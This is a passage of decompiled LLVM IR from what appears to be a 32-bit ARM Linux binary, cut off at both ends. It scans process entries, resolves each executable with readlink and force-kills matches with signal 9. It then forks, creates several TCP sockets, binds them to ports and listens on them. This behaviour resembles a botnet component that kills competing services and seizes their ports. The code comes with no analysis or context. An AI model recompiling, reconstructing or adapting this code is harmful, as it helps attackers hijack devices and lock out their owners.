  %v2_e2b8 = icmp eq %__dirstream* %v3_e2b4, null
  br i1 %v2_e2b8, label %dec_label_pc_e1cc.loopexit, label %dec_label_pc_e2c0.preheader

dec_label_pc_e2c0.preheader:                      ; preds = %dec_label_pc_e260
  %v3_e2c4138 = call %dirent* @readdir(%__dirstream* nonnull %v3_e2b4)
  %v5_e2c4139 = ptrtoint %dirent* %v3_e2c4138 to i32
  store i32 %v5_e2c4139, i32* @r6, align 4
  %v2_e2c8140 = icmp eq %dirent* %v3_e2c4138, null
  store i32 4096, i32* @r1, align 4
  store i32 %v2_df28, i32* @r0, align 4
  br i1 %v2_e2c8140, label %dec_label_pc_e3c8, label %dec_label_pc_e2d8thread-pre-split

dec_label_pc_e2c0.loopexit:                       ; preds = %dec_label_pc_e2e0, %dec_label_pc_e378
  %v0_e2c0.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_e2c0 = inttoptr i32 %v0_e2c0.pre to %__dirstream*
  %v3_e2c4 = call %dirent* @readdir(%__dirstream* %v1_e2c0)
  %v5_e2c4 = ptrtoint %dirent* %v3_e2c4 to i32
  store i32 %v5_e2c4, i32* @r6, align 4
  %v2_e2c8 = icmp eq %dirent* %v3_e2c4, null
  store i32 4096, i32* @r1, align 4
  store i32 %v2_df28, i32* @r0, align 4
  br i1 %v2_e2c8, label %dec_label_pc_e3c8, label %dec_label_pc_e2d8thread-pre-split

dec_label_pc_e2d8thread-pre-split:                ; preds = %dec_label_pc_e2c0.preheader, %dec_label_pc_e2c0.loopexit
  %v0_e2d8.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e2d8

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2d8thread-pre-split, %dec_label_pc_e3a0
  %v0_e2d8 = phi i32 [ %v0_e2d8.pr, %dec_label_pc_e2d8thread-pre-split ], [ 1, %dec_label_pc_e3a0 ]
  %v2_e2d8 = icmp eq i32 %v0_e2d8, 0
  br i1 %v2_e2d8, label %dec_label_pc_e2e0, label %dec_label_pc_e3c8

dec_label_pc_e2e0:                                ; preds = %dec_label_pc_e2d8
  %v0_e2e0 = call i32 @function_11838()
  %v0_e2e4 = load i32, i32* @r5, align 4
  %v2_e2ec = inttoptr i32 %v0_e2e4 to i32*
  %v3_e2ec = call i32 @function_11268(i32 13, i32* %v2_e2ec)
  store i32 %v2_df14, i32* @r0, align 4
  %v3_e2f8 = call i32 @function_117c0(i8* %v2_e20c, i32 %v3_e2ec)
  %v2_e300 = call i32 @function_11798(i8* %v2_e20c)
  %v0_e304 = load i32, i32* @r7, align 4
  %v0_e308 = load i32, i32* @sl, align 4
  %v2_e308 = add i32 %v0_e308, %v2_e300
  store i32 %v2_e308, i32* @r0, align 4
  %v2_e30c = inttoptr i32 %v2_e308 to i8*
  %v3_e30c = call i32 @function_117c0(i8* %v2_e30c, i32 %v0_e304)
  %v2_e314 = call i32 @function_11798(i8* %v2_e20c)
  %v0_e318 = load i32, i32* @r5, align 4
  store i32 %v2_e314, i32* @r4, align 4
  %v2_e324 = inttoptr i32 %v0_e318 to i32*
  %v3_e324 = call i32 @function_11268(i32 15, i32* %v2_e324)
  %v0_e32c = load i32, i32* @sl, align 4
  %v1_e32c = load i32, i32* @r4, align 4
  %v2_e32c = add i32 %v1_e32c, %v0_e32c
  store i32 %v2_e32c, i32* @r0, align 4
  %v2_e330 = inttoptr i32 %v2_e32c to i8*
  %v3_e330 = call i32 @function_117c0(i8* %v2_e330, i32 %v3_e324)
  %v2_e338 = call i32 @function_11798(i8* %v2_e20c)
  %v0_e340 = load i32, i32* @sl, align 4
  %v2_e340 = add i32 %v0_e340, %v2_e338
  store i32 %v2_e340, i32* @r0, align 4
  %v2_e344 = inttoptr i32 %v2_e340 to i8*
  %v3_e344 = call i32 @function_117c0(i8* %v2_e344, i32 ptrtoint (i32* @global_var_12028.116 to i32))
  %v2_e34c = call i32 @function_11798(i8* %v2_e20c)
  %v0_e350 = load i32, i32* @r6, align 4
  %v1_e350 = add i32 %v0_e350, 11
  %v0_e354 = load i32, i32* @sl, align 4
  %v2_e354 = add i32 %v0_e354, %v2_e34c
  store i32 %v2_e354, i32* @r0, align 4
  %v2_e358 = inttoptr i32 %v2_e354 to i8*
  %v3_e358 = call i32 @function_117c0(i8* %v2_e358, i32 %v1_e350)
  %v7_e368 = call i32 @readlink(i8* %v2_e20c, i8* %tmp132, i32 4096)
  %v2_e36c = icmp eq i32 %v7_e368, -1
  br i1 %v2_e36c, label %dec_label_pc_e2c0.loopexit, label %dec_label_pc_e378

dec_label_pc_e378:                                ; preds = %dec_label_pc_e2e0
  %v2_e378 = call i32 @function_11798(i8* %tmp132)
  store i32 %v2_e378, i32* @r1, align 4
  %v4_e38c = call i32 @function_11aec(i8* %tmp132, i32 %v2_e378, i32 %v2_e19c.pre-phi)
  %v2_e390 = icmp eq i32 %v4_e38c, -1
  br i1 %v2_e390, label %dec_label_pc_e2c0.loopexit, label %dec_label_pc_e3a0

dec_label_pc_e3a0:                                ; preds = %dec_label_pc_e378
  %v0_e398 = load i32, i32* @r7, align 4
  %v2_e3a0 = inttoptr i32 %v0_e398 to i8*
  %v3_e3a0 = call i32 @function_118c4(i8* %v2_e3a0, i32 10)
  %v2_e3a8 = call i32 @kill(i32 %v3_e3a0, i32 9)
  %v0_e3ac = load i32, i32* %sb.global-to-local, align 4
  %v1_e3ac = inttoptr i32 %v0_e3ac to %__dirstream*
  %v3_e3b0 = call %dirent* @readdir(%__dirstream* %v1_e3ac)
  %v5_e3b0 = ptrtoint %dirent* %v3_e3b0 to i32
  store i32 %v5_e3b0, i32* @r6, align 4
  %v2_e3b4 = icmp eq %dirent* %v3_e3b0, null
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_df28, i32* @r0, align 4
  br i1 %v2_e3b4, label %dec_label_pc_e3c8, label %dec_label_pc_e2d8

dec_label_pc_e3c8:                                ; preds = %dec_label_pc_e2c0.preheader, %dec_label_pc_e2c0.loopexit, %dec_label_pc_e3a0, %dec_label_pc_e2d8
  %v0_e3c8 = load i32, i32* %sb.global-to-local, align 4
  %v1_e3c8 = inttoptr i32 %v0_e3c8 to %__dirstream*
  %v3_e3cc = call i32 @closedir(%__dirstream* %v1_e3c8)
  %v0_e3d0 = load i32, i32* @r8, align 4
  %v1_e3d0 = inttoptr i32 %v0_e3d0 to %__dirstream*
  %v3_e3d4 = call %dirent* @readdir(%__dirstream* %v1_e3d0)
  %v2_e3d8 = icmp eq %dirent* %v3_e3d4, null
  br i1 %v2_e3d8, label %dec_label_pc_e3e0, label %dec_label_pc_e1dc

dec_label_pc_e3e0:                                ; preds = %dec_label_pc_e1cc.loopexit, %dec_label_pc_e3c8, %dec_label_pc_e1dc, %dec_label_pc_e1cc.preheader
  %v0_e3e0 = load i32, i32* @r8, align 4
  %v1_e3e0 = inttoptr i32 %v0_e3e0 to %__dirstream*
  %v3_e3e4 = call i32 @closedir(%__dirstream* %v1_e3e0)
  %v0_e3e8 = load i32, i32* @r5, align 4
  %v1_e3e8 = urem i32 %v0_e3e8, 256
  br label %dec_label_pc_e3ec

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e1ac, %dec_label_pc_e3e0
  %storemerge = phi i32 [ %v1_e3e8, %dec_label_pc_e3e0 ], [ %v5_e1b8, %dec_label_pc_e1ac ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e3f0 = call i32 @sleep(i32 1)
  %v1_e3f8 = call i32 @function_11294(i32 13)
  %v1_e400 = call i32 @function_11294(i32 14)
  %v1_e408 = call i32 @function_11294(i32 15)
  br label %dec_label_pc_e40c

dec_label_pc_e40c:                                ; preds = %dec_label_pc_dfb0, %dec_label_pc_e44c, %dec_label_pc_e3ec
  %v0_e40c = load i32, i32* @r4, align 4
  %v2_e418 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_e418, i32* @r4, align 4
  store i32 %v6_df00, i32* @r5, align 4
  store i32 %v9_df00, i32* @r6, align 4
  store i32 %v12_df00, i32* @r7, align 4
  store i32 %v15_df00, i32* @r8, align 4
  store i32 %v21_df00, i32* @sl, align 4
  ret i32 %v0_e40c

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e100
  %v1_e41c = add i32 %v0_e41c, 1
  %v7_e420 = icmp eq i32 %v0_e41c, 0
  br i1 %v7_e420, label %dec_label_pc_e428, label %dec_label_pc_e108

dec_label_pc_e428:                                ; preds = %dec_label_pc_e41c
  %v1_e428 = add i32 %v0_e110, 3
  %v2_e428 = inttoptr i32 %v1_e428 to i8*
  %v3_e428 = load i8, i8* %v2_e428, align 1
  %v7_e42c = icmp eq i8 %v3_e428, 65
  br i1 %v7_e42c, label %dec_label_pc_e43c, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e428
  br label %dec_label_pc_e0d8.backedge

dec_label_pc_e43c:                                ; preds = %dec_label_pc_e428
  store i32 %v1_e41c, i32* @r4, align 4
  br label %dec_label_pc_e0d8.backedge

dec_label_pc_e0d8.backedge:                       ; preds = %.thread33, %dec_label_pc_e43c, %dec_label_pc_e10c
  %v0_e11881 = phi i32 [ %v1_e41c, %dec_label_pc_e43c ], [ %v0_e11882, %dec_label_pc_e10c ], [ %v0_e11882, %.thread33 ]
  %v0_e41c70 = phi i32 [ %v1_e41c, %dec_label_pc_e43c ], [ %v0_e10c, %dec_label_pc_e10c ], [ %v1_e41c, %.thread33 ]
  %v0_e100.pr67 = phi i32 [ 0, %dec_label_pc_e43c ], [ %v0_e100.pr68, %dec_label_pc_e10c ], [ 0, %.thread33 ]
  %v0_e0d8 = add i32 %v0_e110, 1
  %v1_e0d8 = add i32 %v0_e110, 3
  %v2_e0d8 = inttoptr i32 %v1_e0d8 to i8*
  %v3_e0d8 = load i8, i8* %v2_e0d8, align 1
  %v2_e0dc = icmp eq i8 %v3_e0d8, 0
  %v1_e0e0 = add i32 %v0_e0e078, 1
  br i1 %v2_e0dc, label %dec_label_pc_e118, label %dec_label_pc_e0e8

dec_label_pc_e44c:                                ; preds = %dec_label_pc_e190
  %v1_e450 = call i32 @function_11294(i32 13)
  %v1_e458 = call i32 @function_11294(i32 14)
  %v1_e460 = call i32 @function_11294(i32 15)
  %v1_e468 = call i32 @function_11294(i32 17)
  br label %dec_label_pc_e40c

dec_label_pc_e470:                                ; preds = %dec_label_pc_df00
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_dfb0

; uselistorder directives
  uselistorder i32 %v1_e0e0, { 1, 0 }
  uselistorder i8 %v3_e0d8, { 1, 0 }
  uselistorder i32 %v0_e11881, { 1, 0 }
  uselistorder i32 %v1_e41c, { 4, 3, 0, 2, 1 }
  uselistorder %dirent* %v3_e3d4, { 1, 0 }
  uselistorder i8* %tmp132, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e144, { 1, 0 }
  uselistorder i32 %v0_e15028, { 1, 0 }
  uselistorder i32 %v1_e168, { 0, 3, 1, 2 }
  uselistorder i32 %v0_e10c, { 1, 0 }
  uselistorder i32 %v0_e0e078, { 1, 0 }
  uselistorder i32 %v0_e41c, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_e11882, { 1, 2, 0 }
  uselistorder i32 %v1_e0e052, { 1, 0 }
  uselistorder i32 %v2_e0c4, { 1, 0 }
  uselistorder i32 %v1_e0c0, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v0_e07c13, { 1, 0, 2 }
  uselistorder i32 %v0_e06c, { 1, 0 }
  uselistorder i32 %v1_e04c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32* %v3_df70, { 1, 0, 2 }
  uselistorder i32 %v2_df28, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8773, { 1, 0, 2 }
  uselistorder i8* %stack_var_-581, { 2, 0, 1 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32)* @function_118c4, { 1, 0 }
  uselistorder i32 47, { 1, 2, 0 }
  uselistorder i32 (i32*, i32, i32)* @function_119f0, { 1, 0 }
  uselistorder i32 512, { 4, 0, 5, 7, 1, 8, 2, 9, 3, 10, 6 }
  uselistorder i32* (i32*, i32, i32)* @memset, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_e0d8.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e40c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e3ec, { 1, 0 }
  uselistorder label %dec_label_pc_e3e0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e3c8, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_e2d8, { 1, 0 }
  uselistorder label %dec_label_pc_e2d8thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e2c0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e1dc, { 1, 0 }
  uselistorder label %dec_label_pc_e1dc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e1cc.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e164, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e10c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e0e8, { 1, 0 }
  uselistorder label %dec_label_pc_e08c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dff0.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_e040, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_e008, { 1, 0 }
  uselistorder label %dec_label_pc_dfb0, { 1, 0 }
}

define i32 @function_e49c(i32 %arg1) local_unnamed_addr {
dec_label_pc_e49c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-8476 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-4380 = alloca i32, align 4
  %stack_var_-8484 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e49c = load i32, i32* @r4, align 4
  store i32 %v3_e49c, i32* %stack_var_-36, align 4
  %v6_e49c = load i32, i32* @r5, align 4
  %v9_e49c = load i32, i32* @r6, align 4
  %v12_e49c = load i32, i32* @r7, align 4
  %v15_e49c = load i32, i32* @r8, align 4
  %v18_e49c = load i32, i32* @sb, align 4
  %v21_e49c = load i32, i32* @sl, align 4
  %v24_e49c = load i32, i32* @fp, align 4
  %v28_e49c = ptrtoint i32* %stack_var_-36 to i32
  %v2_e4a8 = call i32 @time(i32* null)
  store i32 %v2_e4a8, i32* @r7, align 4
  %v0_e4b0 = call i32 @fork()
  %v2_e4b4 = icmp eq i32 %v0_e4b0, -1
  %. = zext i1 %v2_e4b4 to i32
  %tmp131 = icmp slt i32 %v0_e4b0, 1
  %storemerge87 = select i1 %tmp131, i32 %., i32 1
  store i32 %storemerge87, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1a428.118 to i32), i32* %r3.global-to-local, align 4
  %v2_e4d0 = icmp eq i32 %storemerge87, 0
  store i32 %v0_e4b0, i32* @global_var_1a428.118, align 4
  br i1 %v2_e4d0, label %dec_label_pc_e4e4, label %dec_label_pc_e4dc

dec_label_pc_e4dc:                                ; preds = %dec_label_pc_e5f8, %dec_label_pc_e4e4, %dec_label_pc_e49c
  %v29_e4e0 = phi i32 [ -1, %dec_label_pc_e4e4 ], [ %v0_e4b0, %dec_label_pc_e49c ], [ %v5_e60c, %dec_label_pc_e5f8 ]
  %v2_e4e0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_e4e0, i32* @r4, align 4
  store i32 %v6_e49c, i32* @r5, align 4
  store i32 %v9_e49c, i32* @r6, align 4
  store i32 %v12_e49c, i32* @r7, align 4
  store i32 %v15_e49c, i32* @r8, align 4
  store i32 %v18_e49c, i32* @sb, align 4
  store i32 %v21_e49c, i32* @sl, align 4
  store i32 %v24_e49c, i32* @fp, align 4
  ret i32 %v29_e4e0

dec_label_pc_e4e4:                                ; preds = %dec_label_pc_e49c
  %v1_e4e8 = call i32 @sleep(i32 5)
  %v1_e4f0 = call i32* @malloc(i32 4096)
  %v3_e4f0 = ptrtoint i32* %v1_e4f0 to i32
  store i32 ptrtoint (i32* @global_var_1a3cc.120 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1a424.122 to i32), i32* %r1.global-to-local, align 4
  store i32 %v3_e4f0, i32* %r2.global-to-local, align 4
  %v0_e500 = load i32, i32* @r5, align 4
  %v1_e500 = trunc i32 %v0_e500 to i8
  %v3_e500 = bitcast i32* %v1_e4f0 to i8*
  store i8 %v1_e500, i8* %v3_e500, align 1
  %v0_e508 = load i32, i32* @r5, align 4
  %v1_e508 = load i32, i32* %r3.global-to-local, align 4
  %v2_e508 = inttoptr i32 %v1_e508 to i32*
  store i32 %v0_e508, i32* %v2_e508, align 4
  %v0_e50c = load i32, i32* %r2.global-to-local, align 4
  %v1_e50c = load i32, i32* %r1.global-to-local, align 4
  %v2_e50c = inttoptr i32 %v1_e50c to i32*
  store i32 %v0_e50c, i32* %v2_e50c, align 4
  %v1_e510 = call i32 @function_1134c(i32 13)
  %v1_e518 = call i32 @function_1134c(i32 14)
  %v0_e51c = load i32, i32* @r5, align 4
  store i32 %v0_e51c, i32* %r1.global-to-local, align 4
  %v2_e524 = inttoptr i32 %v0_e51c to i32*
  %v3_e524 = call i32 @function_11268(i32 13, i32* %v2_e524)
  %v2_e52c = ptrtoint i32* %stack_var_-4380 to i32
  store i32 %v2_e52c, i32* @fp, align 4
  store i32 %v3_e524, i32* %r1.global-to-local, align 4
  store i32 %v2_e52c, i32* @r0, align 4
  %v2_e538 = bitcast i32* %stack_var_-4380 to i8*
  %v3_e538 = call i32 @function_117c0(i8* %v2_e538, i32 %v3_e524)
  %v0_e53c = load i32, i32* @fp, align 4
  %v2_e53c = add i32 %v0_e53c, %v3_e538
  store i32 %v2_e53c, i32* @r4, align 4
  %v1_e540 = call i32 @getpid()
  %v2_e548 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_e548, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_e550 = trunc i32 %v1_e540 to i8
  %v4_e550 = call i32 @function_11bfc(i8 %v3_e550, i32 10, i32 %v2_e548)
  store i32 %v4_e550, i32* %r1.global-to-local, align 4
  %v0_e558 = load i32, i32* @r4, align 4
  store i32 %v0_e558, i32* @r0, align 4
  %v2_e55c = inttoptr i32 %v0_e558 to i8*
  %v3_e55c = call i32 @function_117c0(i8* %v2_e55c, i32 %v4_e550)
  %v0_e560 = load i32, i32* @r5, align 4
  store i32 %v0_e560, i32* %r1.global-to-local, align 4
  %v0_e564 = load i32, i32* @r4, align 4
  %v2_e564 = add i32 %v0_e564, %v3_e55c
  store i32 %v2_e564, i32* @r4, align 4
  %v2_e56c = inttoptr i32 %v0_e560 to i32*
  %v3_e56c = call i32 @function_11268(i32 14, i32* %v2_e56c)
  store i32 %v3_e56c, i32* %r1.global-to-local, align 4
  %v0_e574 = load i32, i32* @r4, align 4
  store i32 %v0_e574, i32* @r0, align 4
  %v2_e578 = inttoptr i32 %v0_e574 to i8*
  %v3_e578 = call i32 @function_117c0(i8* %v2_e578, i32 %v3_e56c)
  %v0_e57c = load i32, i32* @r5, align 4
  store i32 %v0_e57c, i32* %r1.global-to-local, align 4
  store i32 %v3_e578, i32* @r6, align 4
  %v4_e588 = call i32 (i8*, i32, ...) @open(i8* %v2_e538, i32 %v0_e57c)
  %v2_e58c = icmp eq i32 %v4_e588, -1
  br i1 %v2_e58c, label %dec_label_pc_e4dc, label %dec_label_pc_e594

dec_label_pc_e594:                                ; preds = %dec_label_pc_e4e4
  %v1_e594 = call i32 @close(i32 %v4_e588)
  %v1_e59c = call i32 @function_11294(i32 13)
  %v1_e5a4 = call i32 @function_11294(i32 14)
  store i32 ptrtoint (i8** @global_var_1a424.122 to i32), i32* %r3.global-to-local, align 4
  %v2_e5b0 = load i8*, i8** @global_var_1a424.122, align 4
  %v3_e5b0 = ptrtoint i8* %v2_e5b0 to i32
  store i32 %v3_e5b0, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v7_e5bc = call i32 @readlink(i8* %v2_e538, i8* %v2_e5b0, i32 4095)
  %v2_e5c0 = icmp eq i32 %v7_e5bc, -1
  br i1 %v2_e5c0, label %.thread2.thread, label %bb134

.thread2.thread:                                  ; preds = %dec_label_pc_e594
  %v0_e5cc24 = load i32, i32* @r4, align 4
  %v1_e5cc25 = load i32, i32* @r6, align 4
  %v2_e5cc26 = add i32 %v1_e5cc25, %v0_e5cc24
  store i32 %v2_e5cc26, i32* %r1.global-to-local, align 4
  br label %bb135

bb134:                                            ; preds = %dec_label_pc_e594
  %v3_e5c8 = load i8*, i8** @global_var_1a424.122, align 4
  %v4_e5c8 = ptrtoint i8* %v3_e5c8 to i32
  store i32 %v4_e5c8, i32* %r3.global-to-local, align 4
  %v0_e5cc = load i32, i32* @r4, align 4
  %v1_e5cc = load i32, i32* @r6, align 4
  %v2_e5cc = add i32 %v1_e5cc, %v0_e5cc
  store i32 %v2_e5cc, i32* %r1.global-to-local, align 4
  %v1_e5d0 = load i32, i32* @r5, align 4
  %v2_e5d0 = trunc i32 %v1_e5d0 to i8
  %v5_e5d0 = add i32 %v4_e5c8, %v7_e5bc
  %v6_e5d0 = inttoptr i32 %v5_e5d0 to i8*
  store i8 %v2_e5d0, i8* %v6_e5d0, align 1
  %v1_e5d4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb135

bb135:                                            ; preds = %.thread2.thread, %bb134
  %v1_e5d4 = phi i32 [ %v2_e5cc26, %.thread2.thread ], [ %v1_e5d4.pre, %bb134 ]
  %v0_e5d4 = load i32, i32* @fp, align 4
  %v2_e5d4 = sub i32 %v1_e5d4, %v0_e5d4
  store i32 %v2_e5d4, i32* @r1, align 4
  store i32 %v2_e52c, i32* @r0, align 4
  %v0_e5dc = call i32 @function_11838()
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_e5ec = load i32, i32* @r7, align 4
  store i32 %v0_e5ec, i32* @r5, align 4
  %v2_e5f0 = ptrtoint i32* %stack_var_-8476 to i32
  store i32 %v2_e5f0, i32* @sl, align 4
  store i32 400, i32* @r8, align 4
  %v2_e6dc = ptrtoint i32* %stack_var_-292 to i32
  %v2_e92c = ptrtoint i32* %stack_var_-284 to i32
  %v2_e930 = bitcast i32* %stack_var_-284 to i8*
  %v2_e97c = ptrtoint i32* %stack_var_-220 to i32
  %v2_e980 = bitcast i32* %stack_var_-220 to i8*
  %v2_ead8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_eaec = ptrtoint i32* %stack_var_-44 to i32
  %v2_e848 = ptrtoint i32* %stack_var_-108 to i32
  %v2_e810 = ptrtoint i32* %stack_var_-92 to i32
  %v2_e7d8 = ptrtoint i32* %stack_var_-140 to i32
  %v2_e7a0 = ptrtoint i32* %stack_var_-124 to i32
  %v2_e768 = ptrtoint i32* %stack_var_-76 to i32
  %v2_e720 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_e5f8

dec_label_pc_e5f8:                                ; preds = %dec_label_pc_e8f0, %bb135
  %stack_var_-8480.0 = phi i32 [ 0, %bb135 ], [ %stack_var_-8480.3, %dec_label_pc_e8f0 ]
  %v1_e5fc = call i32 @function_1134c(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e608 = call i32 @function_11268(i32 13, i32* null)
  %v4_e608 = inttoptr i32 %v3_e608 to i8*
  %v3_e60c = call %__dirstream* @opendir(i8* %v4_e608)
  %v5_e60c = ptrtoint %__dirstream* %v3_e60c to i32
  store i32 %v5_e60c, i32* @sb, align 4
  %v2_e610 = icmp eq %__dirstream* %v3_e60c, null
  br i1 %v2_e610, label %dec_label_pc_e4dc, label %dec_label_pc_e618

dec_label_pc_e618:                                ; preds = %dec_label_pc_e5f8
  %v1_e61c = call i32 @function_11294(i32 13)
  %v1_e628 = call i32 @function_df00(i32 58811)
  %v1_e634 = call i32 @function_df00(i32 50951)
  %v1_e640 = call i32 @function_df00(i32 14853)
  %v1_e648 = call i32 @function_df00(i32 20480)
  %v1_e654 = call i32 @function_df00(i32 47873)
  %v1_e660 = call i32 @function_df00(i32 57616)
  %v1_e66c = call i32 @function_df00(i32 2842)
  %v1_e678 = call i32 @function_df00(i32 10522)
  %v1_e680 = call i32 @function_df00(i32 5632)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e70c = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_e710 = icmp eq i32 %v3_e70c, -1
  store i32 %v3_e70c, i32* @r4, align 4
  br i1 %v2_e710, label %dec_label_pc_e738, label %dec_label_pc_e71c

dec_label_pc_e71c:                                ; preds = %dec_label_pc_e618
  store i32 %v2_e720, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e728 = call i32 @bind(i32 %v2_e720, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e72c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e734 = call i32 @listen(i32 %v0_e72c, i32 1)
  br label %dec_label_pc_e738

dec_label_pc_e738:                                ; preds = %dec_label_pc_e618, %dec_label_pc_e71c
  %v1_e73c = call i32 @function_df00(i32 5888)
  %v2_e740 = icmp eq i32 %v1_e73c, 0
  br i1 %v2_e740, label %dec_label_pc_ec04, label %dec_label_pc_e748

dec_label_pc_e748:                                ; preds = %dec_label_pc_ec28, %dec_label_pc_ec18, %dec_label_pc_ec04, %dec_label_pc_e738, %dec_label_pc_ec3c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e754 = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_e758 = icmp eq i32 %v3_e754, -1
  store i32 %v3_e754, i32* %r4.global-to-local, align 4
  br i1 %v2_e758, label %dec_label_pc_e780, label %dec_label_pc_e764

dec_label_pc_e764:                                ; preds = %dec_label_pc_e748
  store i32 %v2_e768, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e770 = call i32 @bind(i32 %v2_e768, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e774 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e77c = call i32 @listen(i32 %v0_e774, i32 1)
  br label %dec_label_pc_e780

dec_label_pc_e780:                                ; preds = %dec_label_pc_e748, %dec_label_pc_e764
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e78c = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_e790 = icmp eq i32 %v3_e78c, -1
  store i32 %v3_e78c, i32* %r4.global-to-local, align 4
  br i1 %v2_e790, label %dec_label_pc_e7b8, label %dec_label_pc_e79c

dec_label_pc_e79c:                                ; preds = %dec_label_pc_e780
  store i32 %v2_e7a0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e7a8 = call i32 @bind(i32 %v2_e7a0, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e7ac = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e7b4 = call i32 @listen(i32 %v0_e7ac, i32 1)
  br label %dec_label_pc_e7b8

dec_label_pc_e7b8:                                ; preds = %dec_label_pc_e780, %dec_label_pc_e79c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e7c4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_e7c8 = icmp eq i32 %v3_e7c4, -1
  store i32 %v3_e7c4, i32* %r4.global-to-local, align 4
  br i1 %v2_e7c8, label %dec_label_pc_e7f0, label %dec_label_pc_e7d4

dec_label_pc_e7d4:                                ; preds = %dec_label_pc_e7b8
  store i32 %v2_e7d8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_e7e0 = call i32 @bind(i32 %v2_e7d8, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_e7e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e7ec = call i32 @listen(i32 %v0_e7e4, i32 1)
  br label %dec_label_pc_e7f0

dec_label_pc_e7f0:                                ; preds = %dec_label_pc_e7b8, %dec_label_pc_e7d4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e7fc = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_e800 = icmp eq i32 %v3_e7fc, -1
  store i32 %v3_e7fc, i32* %r4.global-to-local, align 4
  br i1 %v2_e800, label %dec_label_pc_e828, label %dec_label_pc_e80c

dec_label_pc_e80c:                                ; preds = %dec_label_pc_e7f0
